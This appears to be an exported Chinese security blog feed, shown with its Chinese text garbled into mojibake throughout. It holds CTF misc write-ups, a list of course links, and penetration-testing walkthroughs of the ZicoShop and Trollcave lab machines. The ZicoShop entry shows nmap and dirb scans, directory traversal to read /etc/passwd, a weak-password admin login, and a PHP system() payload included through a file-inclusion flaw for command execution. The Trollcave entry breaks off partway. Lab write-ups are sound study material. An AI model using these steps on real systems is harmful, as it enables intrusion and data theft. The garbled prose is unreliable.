id="å‚…é‡Œå¶å…‰å­¦å®éªŒ-å±±å¸å¹³å°"><a href="#å‚…é‡Œå¶å…‰å­¦å®éªŒ-å±±å¸å¹³å°" class="headerlink" title="å‚…é‡Œå¶å…‰å­¦å®éªŒ(å±±å¸å¹³å°)"></a>å‚…é‡Œå¶å…‰å­¦å®éªŒ(å±±å¸å¹³å°)</h2><p>åˆ©ç”¨è„šæœ¬æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ç›´æ¥è·‘å°±è¡Œ</p><pre><code>import numpy as npimport cv2 as cvfrom matplotlib import pyplot as pltimg = cv.imread(&#39;1.bmp&#39;, 0)f = np.fft.fft2(img)logf = 20*np.log(np.abs(f))plt.imshow(logf, &#39;gray&#39;)plt.show()</code></pre><p>å‘ï¼šéœ€è¦å®‰è£…æ¨¡æ¿matplotlibï¼ˆè¿™ä¸ªéœ€è¦æ³¨æ„ï¼Œå…¶ä½™çš„æ²¡å‘ï¼‰<a href="https://blog.csdn.net/zzx2016zzx/article/details/83099583" target="_blank" rel="noopener">https://blog.csdn.net/zzx2016zzx/article/details/83099583</a></p><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><p>ä¼šæœ‰client.pcapå’Œserve.keyæ–‡ä»¶ï¼Œæ‰“å¼€wiresharkç‚¹å‡»ç¼–è¾‘</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8805%E6%97%A52318_1.png" alt></p><p>okæˆ‘å·²ç»å¾ˆè¯¦ç»†çš„åšå‡ºä¸€å¼ å›¾ï¼Œæœ€åè§£å¯†å®Œï¼Œæœç´¢httpå³å¯æ‰¾åˆ°flag</p><h1 id="2021-02-08"><a href="#2021-02-08" class="headerlink" title="2021-02-08"></a>2021-02-08</h1><h2 id="ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ"><a href="#ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ" class="headerlink" title="ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ"></a>ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ</h2><p>å«¦å¨¥å½“å¹´å¥”æœˆåï¼Œéå¸¸åæ‚”ï¼Œå› ä¸ºæœˆå®«å¤ªå†·æ¸…ï¼Œå¥¹æƒ³ï¼šæ—©çŸ¥é“è®©åç¾¿è‡ªå·±ä¸Šæ¥äº†ï¼Œå¸¦äº†åªå…”å­çœŸæ˜¯ä¸ç†æ™ºã€‚äºæ˜¯å¥¹å°±å†™äº†ä¸€é¦–æ›²å­ï¼Œè¯‰è¯´çš„æ˜¯æ€€å¿µåç¾¿åœ¨çš„æ—¥å­ã€‚æ— æ•°å¹´åï¼Œå°æ˜å¬åˆ°äº†è¿™é¦–æ›²å­ï¼Œæ¯…ç„¶å†³å®šå†’å……åç¾¿ã€‚ç„¶è€Œå°æ˜ä»æ›²å­ä¸­å¬ä¸å‡ºå•¥æ¥ï¼Œå’‹åŠã€‚ã€‚</p><p>å¾—åˆ°éŸ³ä¹mp3ï¼Œå¸¦æœ‰æ‘©æ–¯å¯†ç ï¼Œç”¨audacityæ‰“å¼€åˆ†ç¦»éŸ³ä¹ï¼Œè§£å¾—ï¼šf029bd6f551139eedeb8e45a175b0786</p><p>flag{f029bd6f551139eedeb8e45a175b0786}</p><h2 id="BJDCTF2020-é¸¡ä½ å¤ªç¾"><a href="#BJDCTF2020-é¸¡ä½ å¤ªç¾" class="headerlink" title="[BJDCTF2020]é¸¡ä½ å¤ªç¾"></a>[BJDCTF2020]é¸¡ä½ å¤ªç¾</h2><p>å¾—åˆ°ä¸¤å¼ gifï¼Œä½†æ˜¯ç¬¬äºŒå¼ æ— æ³•æ˜¾ç¤ºwinhexæ‰“å¼€ï¼Œgif89açš„gifæ–‡ä»¶å¤´è¢«ç¯¡æ”¹16è¿›åˆ¶ä¸º47494638,flag{zhi_yin_you_are_beautiful}</p><h1 id="è½¬æˆ˜ctfshow"><a href="#è½¬æˆ˜ctfshow" class="headerlink" title="è½¬æˆ˜ctfshow"></a>è½¬æˆ˜ctfshow</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åƒé”‹èµ„æº</title>
      <link href="/2021/01/14/qian-feng-zi-yuan/"/>
      <url>/2021/01/14/qian-feng-zi-yuan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="åƒå³°åœ¨çº¿å­¦ä¹ åœ°å€ï¼š"><a href="#åƒå³°åœ¨çº¿å­¦ä¹ åœ°å€ï¼š" class="headerlink" title="åƒå³°åœ¨çº¿å­¦ä¹ åœ°å€ï¼š"></a><strong>åƒå³°åœ¨çº¿å­¦ä¹ åœ°å€ï¼š</strong></h3><p><strong>åœ¨çº¿è§‚çœ‹åœ°å€ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list3.shtml" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list3.shtml</a><br><strong>å®˜æ–¹Bç«™åœ°å€ï¼š</strong><a href="https://space.bilibili.com/146668655" target="_blank" rel="noopener">https://space.bilibili.com/146668655</a><br><strong>å®˜æ–¹çŸ¥ä¹åœ°å€ï¼š</strong><a href="https://www.zhihu.com/org/qian-feng-jiao-yu-39" target="_blank" rel="noopener">https://www.zhihu.com/org/qian-feng-jiao-yu-39</a></p><h3 id="å„å­¦ç§‘å­¦ä¹ èµ„æºï¼š"><a href="#å„å­¦ç§‘å­¦ä¹ èµ„æºï¼š" class="headerlink" title="å„å­¦ç§‘å­¦ä¹ èµ„æºï¼š"></a><strong>å„å­¦ç§‘å­¦ä¹ èµ„æºï¼š</strong></h3><p><strong>Javaï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-java.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-java.shtml?ssss</a></p><p><strong>HTML5/webå‰ç«¯ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss</a></p><p><strong>Pythonï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-python.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-python.shtml?ssss</a></p><p><strong>UIè®¾è®¡ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss</a></p><p><strong>Linux/äº‘è®¡ç®—ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss</a></p><p><strong>è½¯ä»¶æµ‹è¯•ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss</a></p><p><strong>å¤§æ•°æ®ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss</a></p><p><strong>ç‰©è”ç½‘ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss</a></p><p><strong>ç½‘ç»œå®‰å…¨ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss</a></p><p><strong>äº’è”ç½‘è¥é”€ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss</a></p><p><strong>goè¯­è¨€ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-go.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-go.shtml?ssss</a></p><p><strong>Unity/æ¸¸æˆå¼€å‘ï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss</a></p><p><strong>PHPï¼š</strong><a href="http://www.mobiletrain.org/testing/video-list-php.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-php.shtml?ssss</a></p><h3 id="è®¡ç®—æœºç­‰çº§è€ƒè¯•èµ„æºï¼š"><a href="#è®¡ç®—æœºç­‰çº§è€ƒè¯•èµ„æºï¼š" class="headerlink" title="è®¡ç®—æœºç­‰çº§è€ƒè¯•èµ„æºï¼š"></a><strong>è®¡ç®—æœºç­‰çº§è€ƒè¯•èµ„æºï¼š</strong></h3><p><strong>2020ç‰ˆ_å…¨å›½è®¡ç®—æœºç­‰çº§è€ƒè¯•äºŒçº§Javaç¨‹åºè®¾è®¡</strong><br>åœ¨çº¿è§‚çœ‹ï¼š<a href="https://www.bilibili.com/video/BV1sT4y1F7Ka" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1sT4y1F7Ka</a><br>ç½‘ç›˜é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ</a> æå–ç : 2igi<br><strong>2020ç‰ˆ_å…¨å›½è®¡ç®—æœºPythonäºŒçº§çœŸé¢˜è®²è§£</strong><br>åœ¨çº¿è§‚çœ‹ï¼š<a href="https://www.bilibili.com/video/BV1qy4y1B7wN" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1qy4y1B7wN</a><br>ç½‘ç›˜é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ</a> æå–ç : fk9x<br><strong>2020ç‰ˆ_å…¨å›½è®¡ç®—æœºWebäºŒçº§ç­‰çº§è€ƒè¯•</strong><br>åœ¨çº¿è§‚çœ‹ï¼š<a href="https://www.bilibili.com/video/BV1GV411y7VT" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1GV411y7VT</a><br>ç½‘ç›˜é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg" target="_blank" rel="noopener">https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg</a> æå–ç : fjxb<br><strong>2020å¹´è®¡ç®—æœºå…¨å›½ç­‰çº§è€ƒè¯•äºŒçº§Cè¯­è¨€æ•™ç¨‹</strong><br>åœ¨çº¿è§‚çœ‹ï¼š<a href="https://www.bilibili.com/video/BV1Ht4y1i7tx" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ht4y1i7tx</a><br>ç½‘ç›˜é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA" target="_blank" rel="noopener">https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA</a> æå–ç : 5v8p<br><strong>2020ç‰ˆ_å…¨å›½è®¡ç®—æœºMySQLäºŒçº§ç­‰çº§è€ƒè¯•</strong><br>åœ¨çº¿è§‚çœ‹ï¼š<a href="https://www.bilibili.com/video/BV1Ni4y137A7" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ni4y137A7</a><br>ç½‘ç›˜é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg</a> æå–ç : i622<br><strong>2020ç‰ˆå…¨å›½è®¡ç®—æœºä¸€çº§WPS Officeå…¨å¥—è€ƒè¯•æ•™ç¨‹</strong><br>åœ¨çº¿è§‚çœ‹ï¼š<a href="https://www.bilibili.com/video/BV1dK411A7fu" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1dK411A7fu</a><br>ç½‘ç›˜é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q</a> æå–ç : 6ngp</p><h3 id="å…¶ä»–èµ„æºï¼š"><a href="#å…¶ä»–èµ„æºï¼š" class="headerlink" title="å…¶ä»–èµ„æºï¼š"></a><strong>å…¶ä»–èµ„æºï¼š</strong></h3><p><strong>æœ€æ–°åƒé”‹PMPé¡¹ç›®ç®¡ç†è§†é¢‘ ï¼š</strong><a href="https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg" target="_blank" rel="noopener">https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg</a> æå–ç : m47c<br><strong>ã€æºç ã€‘åƒé”‹æ•™ç¨‹ä¹¦ç±ç³»åˆ— ï¼š</strong><a href="https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA" target="_blank" rel="noopener">https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å­¦ä¹ èµ„æ–™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZicoShop</title>
      <link href="/2021/01/09/zicoshop/"/>
      <url>/2021/01/09/zicoshop/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=188204&auto=1&height=66"></iframe><p>ç®€ä»‹ï¼š</p><p>æ˜¯ä¸€ä¸ªç”µå­å•†åŠ¡å»ºç«™æŠ€æœ¯ç½‘ç«™Zico-Shop</p><p>ä¸»è¦åŠŸèƒ½ï¼š</p><p>å»ºç«™æŠ€æœ¯</p><p>ç½‘åº—æ¡ˆä¾‹</p><h2 id="å‘ç°æœåŠ¡ï¼š"><a href="#å‘ç°æœåŠ¡ï¼š" class="headerlink" title="å‘ç°æœåŠ¡ï¼š"></a>å‘ç°æœåŠ¡ï¼š</h2><p>è¡¥å……ï¼š</p><p>-sV:Væ‰«æåˆ°çš„æœåŠ¡çš„ç«¯å£å·ï¼Œapache 2.4</p><p>-sT:TCP -sS:SYN  -Aï¼šæ˜¾ç¤ºè¯¦ç»†çš„ä¿¡æ¯</p><p>å¾—åˆ°ç›®æ ‡ä¸»æœºå¼€æ”¾ç«¯å£å’Œæ“ä½œç³»ç»Ÿ</p><pre><code>nmap -sP 192.168.204.0/24nmap -sS -Pn -n -A -O -T4 192.168.204.141</code></pre><p>å‘ç°ç«¯å£ï¼š</p><p>22ssh</p><p>80HTTP</p><p>111rpcbind 2-4ï¼ˆä¸çŸ¥é“æ˜¯ä»€ä¹ˆçš„ç«¯å£ï¼‰</p><h2 id="æ¼æ´å‘ç°"><a href="#æ¼æ´å‘ç°" class="headerlink" title="æ¼æ´å‘ç°"></a>æ¼æ´å‘ç°</h2><p>å¸¸è¯†ï¼š</p><p>/etc/passwordå­˜å‚¨linuxç³»ç»Ÿæ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯</p><p>linuxç½‘ç«™æ–‡ä»¶çš„é»˜è®¤ç›®å½•ï¼š/var/www</p><p>åœ¨URLå†…é€šè¿‡ç›®å½•ç©¿è¶Š../../../etc/passwdæ¥å°è¯•è®¿é—®</p><p>å‘ç°ï¼š</p><p>The requested URL /etc/password was not found on this server.</p><p>é‚£ä¹ˆè¯¥ç½‘ç«™çš„äºŒçº§ç›®å½•å†æ¬¡è¿›è¡ŒæŸ¥æ‰¾</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51024_1.png" alt></p><p>ç‚¹å¼€ä»¥åçš„URLå˜ä¸ºï¼š</p><p><a href="http://192.168.204.141/view.php?page=tools.html" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=tools.html</a></p><p>ä¿®æ”¹å‚æ•°ï¼š</p><p><a href="http://192.168.204.141/view.php?page=../../etc/passwd" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../etc/passwd</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51058_2.png" alt></p><h2 id="ç›®å½•å‘ç°ï¼š"><a href="#ç›®å½•å‘ç°ï¼š" class="headerlink" title="ç›®å½•å‘ç°ï¼š"></a>ç›®å½•å‘ç°ï¼š</h2><pre><code>dirb http://192.168.204.141/ â†æ³¨æ„ç©ºæ ¼/usr/share/dirb/wordlists/common.txt</code></pre><p>å‘ç°ä»¥ä¸‹ç›®å½•ï¼š</p><pre><code>---- Scanning URL: http://192.168.204.141/ ----+ http://192.168.204.141/cgi-bin/ (CODE:403|SIZE:291)                           ==&gt; DIRECTORY: http://192.168.204.141/css/                                      ==&gt; DIRECTORY: http://192.168.204.141/dbadmin/                                  ==&gt; DIRECTORY: http://192.168.204.141/img/                                      + http://192.168.204.141/index (CODE:200|SIZE:7970)                             + http://192.168.204.141/index.html (CODE:200|SIZE:7970)                        ==&gt; DIRECTORY: http://192.168.204.141/js/                                       + http://192.168.204.141/LICENSE (CODE:200|SIZE:1094)                           + http://192.168.204.141/package (CODE:200|SIZE:789)                            + http://192.168.204.141/server-status (CODE:403|SIZE:296)                      + http://192.168.204.141/tools (CODE:200|SIZE:8355)                             ==&gt; DIRECTORY: http://192.168.204.141/vendor/                                   + http://192.168.204.141/view (CODE:200|SIZE:0)     </code></pre><p>è®¿é—®dbadmin</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51127_3.png" alt></p><p>ç‚¹å‡»è¿›å…¥test_db.php</p><p>è¯•è¯•å¼±å£ä»¤ï¼šadminç™»é™†æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51130_4.png" alt></p><p>è¿™ä¸ªåœ°æ–¹ç»™äººçš„æ„Ÿè§‰å°±åƒæ˜¯å¯ä»¥ç®¡ç†æ•°æ®åº“ä¸€æ ·æ‰€ä»¥è¯´åº”è¯¥å¯ä»¥ä¸Šä¼ ä¸€ä¸ªä¸œè¥¿åˆ°æ•°æ®åº“ä»€ä¹ˆçš„ï¼Œè€Œä¸”å°±è¿™ä¸ªé¡µé¢è€Œè¨€ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“æ˜¯æ²¡æœ‰é—®é¢˜çš„</p><h2 id="æ•°æ®åº“æ“ä½œ"><a href="#æ•°æ®åº“æ“ä½œ" class="headerlink" title="æ•°æ®åº“æ“ä½œ"></a>æ•°æ®åº“æ“ä½œ</h2><h3 id="1-åˆ›å»ºæ–°çš„æ•°æ®åº“å’Œè¡¨æ ¼"><a href="#1-åˆ›å»ºæ–°çš„æ•°æ®åº“å’Œè¡¨æ ¼" class="headerlink" title="1.åˆ›å»ºæ–°çš„æ•°æ®åº“å’Œè¡¨æ ¼"></a>1.åˆ›å»ºæ–°çš„æ•°æ®åº“å’Œè¡¨æ ¼</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51142_6.png" alt></p><p>é€‰æ‹©æ•°æ®åº“ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51149_8.png" alt></p><p>åˆ›å»ºè¡¨æ ¼ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51150_9.png" alt></p><h3 id="2-è¡¨æ ¼é‡Œå‚¨å­˜å¯æ‰§è¡Œçš„phpä»£ç "><a href="#2-è¡¨æ ¼é‡Œå‚¨å­˜å¯æ‰§è¡Œçš„phpä»£ç " class="headerlink" title="2.è¡¨æ ¼é‡Œå‚¨å­˜å¯æ‰§è¡Œçš„phpä»£ç "></a>2.è¡¨æ ¼é‡Œå‚¨å­˜å¯æ‰§è¡Œçš„phpä»£ç </h3><?php system(ls);?><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51159_10.png" alt></p><h3 id="3-phpä»£ç é‡Œæ‰§è¡Œè¿œç¨‹ä¸»æœºå‘½ä»¤"><a href="#3-phpä»£ç é‡Œæ‰§è¡Œè¿œç¨‹ä¸»æœºå‘½ä»¤" class="headerlink" title="3.phpä»£ç é‡Œæ‰§è¡Œè¿œç¨‹ä¸»æœºå‘½ä»¤"></a>3.phpä»£ç é‡Œæ‰§è¡Œè¿œç¨‹ä¸»æœºå‘½ä»¤</h3><p>é€šè¿‡ä¹‹å‰çš„æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ‰§è¡Œ</p><p><a href="http://192.168.204.141/view.php?page=../../usr/databases/bing.php" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../usr/databases/bing.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51202_11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥é—¨ </tag>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trollcaveæ¸—é€æµ‹è¯•</title>
      <link href="/2020/12/28/trollcave/"/>
      <url>/2020/12/28/trollcave/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç®€ä»‹ï¼šä¸€ä¸ªç¤¾åŒºè®ºå›ç½‘ç«™</p><p><em>â€œGod himself cannot hack this website.â€ â€“ dragon, site admin</em></p><p>å¾ˆç‰›é€¼çš„ä»‹ç»å•Šï¼ï¼</p><h1 id="Trollcaveæ¸—é€æµ‹è¯•æ¡ˆä¾‹ï¼š"><a href="#Trollcaveæ¸—é€æµ‹è¯•æ¡ˆä¾‹ï¼š" class="headerlink" title="Trollcaveæ¸—é€æµ‹è¯•æ¡ˆä¾‹ï¼š"></a>Trollcaveæ¸—é€æµ‹è¯•æ¡ˆä¾‹ï¼š</h1><h2 id="1-äº†è§£å…¶åŠŸèƒ½"><a href="#1-äº†è§£å…¶åŠŸèƒ½" class="headerlink" title="1.äº†è§£å…¶åŠŸèƒ½"></a>1.äº†è§£å…¶åŠŸèƒ½</h2><p>ä¸»è¦åŠŸèƒ½ï¼šæ¬¢è¿å¯¼è¯­é¡µé¢ï¼Œå¯†ç é‡ç½®ï¼Œæ³•å¾‹å®—æ•™</p><h2 id="2-å‘ç°æœåŠ¡ï¼ˆnmapï¼‰"><a href="#2-å‘ç°æœåŠ¡ï¼ˆnmapï¼‰" class="headerlink" title="2.å‘ç°æœåŠ¡ï¼ˆnmapï¼‰"></a>2.å‘ç°æœåŠ¡ï¼ˆnmapï¼‰</h2><h3 id="1-å‘ç°ä¸»æœºIP"><a href="#1-å‘ç°ä¸»æœºIP" class="headerlink" title="1.å‘ç°ä¸»æœºIP"></a>1.å‘ç°ä¸»æœºIP</h3><pre><code>nmap -sP</code></pre><h3 id="2-å‘ç°ç«¯å£ï¼ˆæœåŠ¡ï¼‰"><a href="#2-å‘ç°ç«¯å£ï¼ˆæœåŠ¡ï¼‰" class="headerlink" title="2.å‘ç°ç«¯å£ï¼ˆæœåŠ¡ï¼‰"></a>2.å‘ç°ç«¯å£ï¼ˆæœåŠ¡ï¼‰</h3><pre><code>nmap -sS -Oï¼ˆæ˜¾ç¤ºæ“ä½œç³»ç»Ÿä¿¡æ¯ï¼‰ -P0ï¼ˆæ— Pingæ‰«æï¼‰ -nï¼ˆä¸è¿›è¡Œdnsè§£æï¼‰ -Anmap -sS -O -P0 -n -A</code></pre><p>å…³äº-P0ï¼š</p><p>æ— pingæ‰«æå¯ä»¥èº²é¿æŸäº›é˜²ç«å¢™çš„é˜²æŠ¤ï¼Œå¯ä»¥åœ¨ç›®æ ‡ä¸»æœºç¦æ­¢pingçš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚</p><p>ç”¨-P0ç¦æ­¢ä¸»æœºå‘ç°ä¼šä½¿Nmapå¯¹æ¯ä¸€ä¸ªæŒ‡ä»¤çš„ç›®æ ‡IPåœ°å€è¿›è¡Œæ‰€è¦æ±‚çš„æ‰«æï¼Œå¯ä»¥ç©¿é€é˜²ç«å¢™ï¼Œä¹Ÿå¯ä»¥é¿å…è¢«é˜²ç«å¢™å‘ç°ã€‚</p><p>å¾—åˆ°ç«¯å£ï¼š</p><p>20ï¼šssh</p><p>80ï¼šHTTP</p><h2 id="3-é€»è¾‘ç¼ºé™·åˆ†æ"><a href="#3-é€»è¾‘ç¼ºé™·åˆ†æ" class="headerlink" title="3.é€»è¾‘ç¼ºé™·åˆ†æ"></a>3.é€»è¾‘ç¼ºé™·åˆ†æ</h2><h3 id="1-åˆ†æç½‘ç«™çš„åŠŸèƒ½"><a href="#1-åˆ†æç½‘ç«™çš„åŠŸèƒ½" class="headerlink" title="1.åˆ†æç½‘ç«™çš„åŠŸèƒ½"></a>1.åˆ†æç½‘ç«™çš„åŠŸèƒ½</h3><p>1.æ³¨å†Œä¸å¯ç”¨</p><p>2.ç½‘ç«™ç”¨æˆ·çš„æƒé™ï¼š</p><p>Kingï¼šsuperadmin</p><p>coderguyï¼šadmin</p><p>3.ä¿®æ”¹ï¼ˆé‡ç½®ï¼‰å¯†ç çš„è·¯å¾„æš´éœ²äº†ï¼š</p><p>password_resets</p><pre><code>æ‰€ä»¥æˆ‘æœ€è¿‘æ”¶åˆ°äº†å¾ˆå¤šç”¨æˆ·çš„ç”µå­é‚®ä»¶ï¼Œä»–ä»¬å¿˜è®°äº†å¯†ç ï¼Œéœ€è¦é‡æ–°è®¾ç½®ã€‚å› ä¸ºè¿™ä¸ªç½‘ç«™æ²¡æœ‰â€œå¿˜è®°å¯†ç â€æŒ‰é’®ï¼Œæˆ‘ä¸å¾—ä¸æ‰‹åŠ¨é‡ç½®ã€‚æˆ‘çœŸçš„åŒå€¦äº†ï¼Œæ‰€ä»¥æ˜¯æ—¶å€™å®æ–½å¯†ç é‡ç½®äº†ã€‚ç›®å‰æ­£å¿™äºæ­¤äº‹ï¼Œä½†ç½‘ç«™ç”µå­é‚®ä»¶æœ‰é—®é¢˜ã€‚æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œç”±äºè¿™ä¸ªåŸå› ï¼Œæ–°ç”¨æˆ·çš„æ¿€æ´»å·²è¢«å…³é—­ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘å·²ç»åœ¨railsä¸­å®ç°äº†ä¸€ä¸ªpassword_resetsèµ„æºï¼ˆimplemented a password_resets resource in railsï¼‰ï¼Œé™¤äº†ç”µå­é‚®ä»¶ä¹‹å¤–ï¼Œå®ƒçš„å·¥ä½œæ•ˆç‡å¤§çº¦æ˜¯90%ã€‚éå¸¸ä»¤äººæ²®ä¸§ã€‚å¦‚æœæœ‰äººå¯¹å¦‚ä½•è®©ç”µå­é‚®ä»¶æ­£å¸¸å·¥ä½œæœ‰ä»»ä½•å»ºè®®ï¼Œè¯·ç»™æˆ‘å‘ä¸€å°</code></pre><p>è¿™é‡Œä¹Ÿå°±æ˜¯è¯´å·²ç»é€šè¿‡å‘é€é‚®ä»¶çš„æ–¹å¼æ¥è¿›è¡Œä¿®æ”¹å¯†ç 